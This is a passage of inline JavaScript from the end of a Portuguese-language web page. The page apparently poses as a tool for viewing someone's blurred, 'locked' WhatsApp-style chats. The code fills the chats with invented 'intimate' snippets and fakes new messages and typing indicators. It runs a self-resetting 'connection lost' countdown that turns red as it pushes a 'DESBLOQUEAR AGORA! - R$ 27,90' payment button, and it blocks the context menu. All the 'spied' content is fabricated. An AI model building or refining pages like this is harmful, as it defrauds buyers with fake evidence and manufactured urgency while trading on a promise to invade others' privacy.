                avatar: "https://i.postimg.cc/gcNd6QBM/img1.jpg",
                online: true,
                messages: [
                    { type: "incoming", time: "09:10", content: "Bom dia! Lembra do nosso encontro?" },
                    { type: "outgoing", time: "09:15", content: "Claro que lembro! Foi inesquec√≠vel" },
                    { type: "incoming", time: "09:20", content: "Estou pensando muito naquela noite..." }
                ]
            },
            pedro: {
                name: "Pedro Alves",
                avatar: "https://i.postimg.cc/gcNd6QBM/img1.jpg",
                online: false,
                messages: [
                    { type: "outgoing", time: "20:45", content: "Pedro, precisamos conversar" },
                    { type: "incoming", time: "21:00", content: "Sobre o qu√™?" },
                    { type: "outgoing", time: "21:05", content: "Sobre o que aconteceu entre n√≥s..." }
                ]
            },
            carla: {
                name: "Carla Dias",
                avatar: "https://i.postimg.cc/gcNd6QBM/img1.jpg",
                online: true,
                messages: [
                    { type: "incoming", time: "11:30", content: "Oi! Tudo bem com voc√™?" },
                    { type: "outgoing", time: "11:35", content: "Tudo! E com voc√™?" },
                    { type: "incoming", time: "11:40", content: "Estou bem! Senti sua falta..." }
                ]
            },
            familia: {
                name: "Fam√≠lia",
                avatar: "",
                online: true,
                isGroup: true,
                messages: [
                    { type: "incoming", time: "19:00", content: "M√£e: Algu√©m viu as fotos da festa?" },
                    { type: "incoming", time: "19:05", content: "Irm√£o: Vi sim! Lembra daquela foto nossa?" },
                    { type: "incoming", time: "19:10", content: "Pai: Essa foi uma noite especial para todos" }
                ]
            },
            trabalho: {
                name: "Trabalho",
                avatar: "",
                online: false,
                isGroup: true,
                messages: [
                    { type: "incoming", time: "15:20", content: "Chefe: Reuni√£o importante amanh√£" },
                    { type: "incoming", time: "15:25", content: "Colega 1: Algu√©m preparou o relat√≥rio?" },
                    { type: "outgoing", time: "15:30", content: "Eu: Sim, j√° terminei" }
                ]
            },
            novamensagem1: {
                name: "Amiga Secreta",
                avatar: "https://i.postimg.cc/gcNd6QBM/img1.jpg",
                online: false,
                messages: [
                    { type: "incoming", time: "11:45", content: "Oi, encontrei algumas mensagens antigas nossas..." },
                    { type: "incoming", time: "11:46", content: "S√£o bem √≠ntimas, voc√™ se lembra?" },
                    { type: "outgoing", time: "11:50", content: "Claro que lembro! Aquela noite foi especial" }
                ]
            },
            novamensagem2: {
                name: "Colega do Trabalho",
                avatar: "https://i.postimg.cc/gcNd6QBM/img1.jpg",
                online: true,
                messages: [
                    { type: "outgoing", time: "12:30", content: "Lembrei de voc√™ hoje..." },
                    { type: "incoming", time: "12:35", content: "S√©rio? Do que exatamente?" },
                    { type: "outgoing", time: "12:40", content: "Daquela conversa √≠ntima que tivemos" }
                ]
            },
            novamensagem3: {
                name: "Ex-namorado(a)",
                avatar: "https://i.postimg.cc/gcNd6QBM/img1.jpg",
                online: false,
                messages: [
                    { type: "incoming", time: "13:15", content: "Acabei de ver nossas mensagens antigas" },
                    { type: "incoming", time: "13:20", content: "S√£o bem sens√≠veis, n√£o deveriam estar bloqueadas?" },
                    { type: "outgoing", time: "13:25", content: "Verdade, s√£o muito pessoais" }
                ]
            }
        };
        
        // Elementos DOM
        const conversationsScreen = document.getElementById('conversationsScreen');
        const chatScreen = document.getElementById('chatScreen');
        const backButton = document.getElementById('backButton');
        const chatName = document.getElementById('chatName');
        const chatAvatar = document.getElementById('chatAvatar');
        const chatOnlineDot = document.getElementById('chatOnlineDot');
        const chatStatus = document.getElementById('chatStatus');
        const chatMessages = document.getElementById('chatMessages');
        const unlockAllButton = document.getElementById('unlockAllButton');
        const promoLink = document.getElementById('promoLink');
        const popupNotification = document.getElementById('popupNotification');
        const popupClose = document.getElementById('popupClose');
        const connectionTimer = document.getElementById('connectionTimer');
        const timerCountdown = document.getElementById('timerCountdown');
        const unlockConnectionButton = document.getElementById('unlockConnectionButton');
        
        // Vari√°veis de controle do timer
        let timeLeft = 300; // 5 minutos em segundos (300)
        let timerInterval = null;
        let timerStarted = false;
        let connectionButtonShown = false;
        let removeButtonTimeout = null;
        
        // Vari√°veis gerais
        let popupShown = false;
        let newConversationsAdded = false;
        
        // Inicializa√ß√£o
        document.addEventListener('DOMContentLoaded', function() {
            // Adicionar event listeners
            setupEventListeners();
            
            // Mostrar pop-up ap√≥s 3 segundos
            setTimeout(showPopupNotification, 3000);
            
            // Atualizar contador de conversas bloqueadas
            updateBlockedConversationsCount();
            
            // Iniciar timer ap√≥s 10 segundos
            setTimeout(startConnectionTimer, 10000);
            
            // Iniciar simula√ß√£o de mensagens chegando ap√≥s 15 segundos
            setTimeout(startMessageSimulation, 15000);
        });
        
        // Configurar todos os event listeners
        function setupEventListeners() {
            // Clique nas conversas
            document.querySelectorAll('.conversation-item').forEach(item => {
                item.addEventListener('click', function(e) {
                    // Prevenir clique duplo acidental
                    if (e.detail > 1) return;
                    
                    selectConversation(this);
                    openChat(this.dataset.chat);
                });
            });
            
            // Bot√£o voltar
            backButton.addEventListener('click', goBackToConversations);
            
            // Bot√£o de desbloquear tudo
            unlockAllButton.addEventListener('click', function(e) {
                resetTimer(); // Resetar timer ao clicar no bot√£o
            });
            
            // Link da promo√ß√£o
            promoLink.addEventListener('click', function(e) {
                resetTimer(); // Resetar timer ao clicar no bot√£o
            });
            
            // Bot√£o de desbloquear e manter conex√£o
            unlockConnectionButton.querySelector('a').addEventListener('click', function(e) {
                resetTimer(); // Resetar timer ao clicar no bot√£o
            });
            
            // Fechar pop-up
            popupClose.addEventListener('click', closePopupNotification);
            
            // Fechar pop-up automaticamente ap√≥s 8 segundos
            popupNotification.addEventListener('animationend', function() {
                if (popupNotification.classList.contains('show')) {
                    setTimeout(closePopupNotification, 8000);
                }
            });
            
            // Prevenir comportamentos padr√£o indesejados
            document.querySelectorAll('a[href="#"]').forEach(el => {
                el.addEventListener('click', function(e) {
                    e.preventDefault();
                });
            });
            
            // Melhorar toque para mobile
            document.addEventListener('touchstart', function() {}, {passive: true});
        }
        
        // Iniciar simula√ß√£o de mensagens chegando
        function startMessageSimulation() {
            // Lista de conversas para simular mensagens
            const conversations = ['maria', 'joao', 'ana', 'carla', 'familia'];
            
            conversations.forEach((chatId, index) => {
                // Delay diferente para cada conversa
                setTimeout(() => {
                    simulateIncomingMessage(chatId);
                }, index * 8000); // 8 segundos entre cada conversa
            });
            
            // Simular digita√ß√£o em algumas conversas
            setTimeout(() => {
                simulateTyping('maria');
            }, 12000);
            
            setTimeout(() => {
                simulateTyping('ana');
            }, 20000);
        }
        
        // Simular mensagem chegando
        function simulateIncomingMessage(chatId) {
            const conversationItem = document.querySelector(`.conversation-item[data-chat="${chatId}"]`);
            if (!conversationItem) return;
            
            const previewElement = conversationItem.querySelector('.conversation-preview');
            const timeElement = conversationItem.querySelector('.conversation-time');
            
            if (!previewElement || !timeElement) return;
            
            // Salvar o estado original
            const originalPreview = previewElement.innerHTML;
            const originalTime = timeElement.textContent;
            
            // Atualizar para mostrar nova mensagem
            timeElement.textContent = 'Agora';
            timeElement.classList.remove('blurred-text');
            timeElement.style.color = '#25d366';
            
            previewElement.innerHTML = `
                <span style="color: #25d366; flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">
                    Nova mensagem üîî
                </span>
                <span class="locked-badge" style="background-color: #dc2626; color: white;">NOVO</span>
            `;
            
            // Adicionar efeito de notifica√ß√£o
            conversationItem.style.backgroundColor = 'rgba(37, 211, 102, 0.1)';
            
            // Restaurar ap√≥s 10 segundos
            setTimeout(() => {
                timeElement.textContent = originalTime;
                timeElement.classList.add('blurred-text');
                timeElement.style.color = '';
                previewElement.innerHTML = originalPreview;
                conversationItem.style.backgroundColor = '';
            }, 10000);
        }
        
        // Simular que algu√©m est√° digitando
        function simulateTyping(chatId) {
            const conversationItem = document.querySelector(`.conversation-item[data-chat="${chatId}"]`);
            if (!conversationItem) return;
            
            const previewElement = conversationItem.querySelector('.conversation-preview');
            if (!previewElement) return;
            
            // Salvar o estado original
            const originalPreview = previewElement.innerHTML;
            
            // Mostrar indicador de digita√ß√£o
            previewElement.innerHTML = `
                <span class="typing-indicator" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">
                    digitando
                    <span class="typing-dot"></span>
                    <span class="typing-dot"></span>
                    <span class="typing-dot"></span>
                </span>
                <span class="locked-badge">üîí</span>
            `;
            
            // Restaurar ap√≥s 5 segundos
            setTimeout(() => {
                previewElement.innerHTML = originalPreview;
            }, 5000);
        }
        
        // Iniciar timer de conex√£o
        function startConnectionTimer() {
            if (timerStarted) return;
            
            timerStarted = true;
            connectionTimer.style.display = 'flex';
            
            // Mostrar bot√£o de desbloquear conex√£o ap√≥s 2 segundos
            setTimeout(function() {
                unlockConnectionButton.style.display = 'block';
                connectionButtonShown = true;
                
                // Programar para remover o bot√£o ap√≥s 30 segundos
                removeButtonTimeout = setTimeout(removeConnectionButton, 30000);
            }, 2000);
            
            // Iniciar contagem regressiva
            timerInterval = setInterval(updateTimer, 1000);
        }
        
        // Atualizar timer
        function updateTimer() {
            timeLeft--;
            
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                timerCountdown.textContent = '00:00';
                
                // Mostrar mensagem de conex√£o perdida
                const timerIcon = connectionTimer.querySelector('.timer-icon');
                const timerText = connectionTimer.querySelector('.timer-text');
                if (timerIcon) timerIcon.innerHTML = '<i class="bi bi-exclamation-triangle"></i>';
                if (timerText) timerText.textContent = 'Conex√£o perdida! Reconectando...';
                timerCountdown.style.display = 'none';
                
                // Remover bot√£o de desbloquear conex√£o
                removeConnectionButton();
                
                // Ap√≥s 10 segundos, reiniciar o timer
                setTimeout(function() {
                    // Restaurar o conte√∫do do timer
                    if (timerIcon) timerIcon.innerHTML = '<i class="bi bi-wifi-off"></i>';
                    if (timerText) timerText.textContent = 'Conex√£o inst√°vel ‚Ä¢ Tempo at√© desconectar:';
                    timerCountdown.style.display = 'block';
                    resetTimer();
                }, 10000);
                
                return;
            }
            
            // Formatar o tempo como MM:SS
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerCountdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            // Adicionar classe de warning quando o tempo estiver acabando
            if (timeLeft <= 60) {
                connectionTimer.classList.add('timer-warning');
                
                // Intensificar a pulsa√ß√£o do bot√£o de conex√£o
                if (timeLeft <= 30) {
                    unlockConnectionButton.querySelector('.unlock-connection-link').style.animation = 'pulse-green 0.8s infinite';
                    
                    // Mudar a cor para vermelho nos √∫ltimos 10 segundos
                    if (timeLeft <= 10) {
                        unlockConnectionButton.querySelector('.unlock-connection-link').style.background = 'linear-gradient(135deg, #dc2626, #b91c1c)';
                        unlockConnectionButton.querySelector('.unlock-connection-link').style.boxShadow = '0 4px 15px rgba(220, 38, 38, 0.3)';
                        unlockConnectionButton.querySelector('.unlock-connection-link').innerHTML = '<i class="bi bi-exclamation-triangle"></i> DESBLOQUEAR AGORA! - R$ 27,90';
                    }
                }
            }
        }
        
        // Remover bot√£o de desbloquear conex√£o
        function removeConnectionButton() {
            if (unlockConnectionButton.style.display === 'block') {
                // Adicionar anima√ß√£o de fade out
                unlockConnectionButton.classList.add('fade-out');
                
                // Remover ap√≥s a anima√ß√£o
                setTimeout(() => {
                    unlockConnectionButton.style.display = 'none';
                    unlockConnectionButton.classList.remove('fade-out');
                    connectionButtonShown = false;
                }, 500);
            }
            
            // Limpar o timeout se existir
            if (removeButtonTimeout) {
                clearTimeout(removeButtonTimeout);
                removeButtonTimeout = null;
            }
        }
        
        // Resetar timer
        function resetTimer() {
            clearInterval(timerInterval);
            timerInterval = null;
            timerStarted = false;
            timeLeft = 300; // 5 minutos
            timerCountdown.textContent = '05:00';
            connectionTimer.classList.remove('timer-warning');
            
            // Resetar o bot√£o de desbloquear conex√£o
            const unlockLink = unlockConnectionButton.querySelector('.unlock-connection-link');
            unlockLink.style.background = 'linear-gradient(135deg, #10b981, #059669)';
            unlockLink.style.boxShadow = '0 4px 15px rgba(16, 185, 129, 0.3)';
            unlockLink.style.animation = 'pulse-green 1.5s infinite';
            unlockLink.innerHTML = '<i class="bi bi-wifi"></i> DESBLOQUEAR E MANTER CONEX√ÉO - R$ 27,90';
            
            // Remover bot√£o
            removeConnectionButton();
            
            // Esconder o timer temporariamente
            connectionTimer.style.display = 'none';
            
            // Reiniciar o timer ap√≥s 5 segundos
            setTimeout(function() {
                startConnectionTimer();
            }, 5000);
        }
        
        // Mostrar pop-up de notifica√ß√£o
        function showPopupNotification() {
            if (popupShown) return;
            
            popupShown = true;
            popupNotification.classList.add('show');
            
            // Adicionar novas conversas ap√≥s 2 segundos do pop-up
            setTimeout(addNewConversations, 2000);
        }
        
        // Fechar pop-up de notifica√ß√£o
        function closePopupNotification() {
            popupNotification.classList.remove('show');
        }
        
        // Adicionar novas conversas √† lista
        function addNewConversations() {
            if (newConversationsAdded) return;
            
            newConversationsAdded = true;
            const conversationsList = document.querySelector('.conversations-list');
            const newConversations = document.querySelectorAll('.new-conversation');
            
            // Mostrar novas conversas com anima√ß√£o
            newConversations.forEach((conversation, index) => {
                setTimeout(() => {
                    conversation.style.display = 'flex';
                    conversation.style.animation = 'fadeIn 0.5s ease-in-out';
                    
                    // Adicionar evento de clique
                    conversation.addEventListener('click', function(e) {
                        if (e.detail > 1) return;
                        selectConversation(this);
                        openChat(this.dataset.chat);
                    });
                }, index * 300); // Delay entre cada nova conversa
            });
            
            // Atualizar contador
            setTimeout(updateBlockedConversationsCount, 1000);
            
            // Atualizar subt√≠tulo do header
            const headerSubtitle = document.querySelector('.header-subtitle');
            headerSubtitle.textContent = '10 conversas bloqueadas';
            headerSubtitle.classList.add('blurred-text');
            
            // Adicionar badge "NOVO" no t√≠tulo
            const headerTitle = document.querySelector('.header-title');
            const originalText = headerTitle.innerHTML;
            headerTitle.innerHTML = originalText + ' <span style="background-color: #dc2626; color: white; padding: 2px 6px; border-radius: 10px; font-size: 10px; margin-left: 5px; flex-shrink: 0;">NOVO</span>';
        }
        
        // Atualizar contador de conversas bloqueadas
        function updateBlockedConversationsCount() {
            const totalConversations = document.querySelectorAll('.conversation-item').length;
            const visibleConversations = Array.from(document.querySelectorAll('.conversation-item')).filter(item => 
                item.style.display !== 'none'
            ).length;
            
            const headerSubtitle = document.querySelector('.header-subtitle');
            if (headerSubtitle) {
                headerSubtitle.textContent = `${visibleConversations} conversas bloqueadas`;
            }
        }
        
        // Selecionar conversa na lista
        function selectConversation(conversationItem) {
            // Remover sele√ß√£o anterior
            document.querySelectorAll('.conversation-item').forEach(item => {
                item.classList.remove('selected');
            });
            
            // Adicionar sele√ß√£o atual
            conversationItem.classList.add('selected');
        }
        
        // Abrir tela do chat
        function openChat(chatId) {
            if (!chatData[chatId]) return;
            
            const chat = chatData[chatId];
            
            // Atualizar informa√ß√µes do chat
            chatName.textContent = chat.name;
            
            if (chat.avatar) {
                chatAvatar.src = chat.avatar;
                chatAvatar.style.display = 'block';
            } else if (chat.isGroup) {
                chatAvatar.style.display = 'none';
            }
            
            // Status online
            chatOnlineDot.style.backgroundColor = chat.online ? '#31a24c' : '#8696a0';
            chatStatus.textContent = chat.online ? 'Online ‚Ä¢ Hor√°rio bloqueado' : 'Visto por √∫ltimo √†s 18:30 ‚Ä¢ Hor√°rio bloqueado';
            
            // Carregar mensagens
            loadChatMessages(chat.messages);
            
            // Alternar telas
            conversationsScreen.classList.remove('active');
            conversationsScreen.classList.add('hidden');
            chatScreen.classList.remove('hidden');
            chatScreen.classList.add('active');
            
            // Esconder timer e bot√£o na tela do chat
            connectionTimer.style.display = 'none';
            unlockConnectionButton.style.display = 'none';
        }
        
        // Carregar mensagens no chat
        function loadChatMessages(messages) {
            chatMessages.innerHTML = '';
            
            // Adicionar data
            const dateElement = document.createElement('div');
            dateElement.className = 'chat-date blurred-text';
            dateElement.textContent = 'HOJE';
            chatMessages.appendChild(dateElement);
            
            // Adicionar mensagens
            messages.forEach(msg => {
                const messageElement = document.createElement('div');
                messageElement.className = `message message-${msg.type} blurred-message`;
                
                const contentElement = document.createElement('div');
                contentElement.className = 'message-content blurred-text';
                contentElement.textContent = msg.content;
                
                const timeElement = document.createElement('span');
                timeElement.className = 'message-time blurred-text';
                timeElement.textContent = msg.time;
                
                messageElement.appendChild(contentElement);
                messageElement.appendChild(timeElement);
                chatMessages.appendChild(messageElement);
            });
            
            // Scroll para o final
            setTimeout(() => {
                chatMessages.scrollTop = chatMessages.scrollHeight;
            }, 100);
        }
        
        // Voltar para lista de conversas
        function goBackToConversations() {
            chatScreen.classList.remove('active');
            chatScreen.classList.add('hidden');
            conversationsScreen.classList.remove('hidden');
            conversationsScreen.classList.add('active');
            
            // Mostrar timer e bot√£o novamente
            if (timerStarted) {
                connectionTimer.style.display = 'flex';
                if (connectionButtonShown) {
                    unlockConnectionButton.style.display = 'block';
                }
            }
        }
        
        // Prevenir zoom em duplo toque no mobile
        let lastTouchEnd = 0;
        document.addEventListener('touchend', function(event) {
            const now = (new Date()).getTime();
            if (now - lastTouchEnd <= 300) {
                event.preventDefault();
            }
            lastTouchEnd = now;
        }, false);
        
        // Prevenir menu de contexto
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });
        
        // Melhorar performance em mobile
        window.addEventListener('load', function() {
            setTimeout(function() {
                window.scrollTo(0, 1);
            }, 0);
        });
    </script>
</body>
</html>




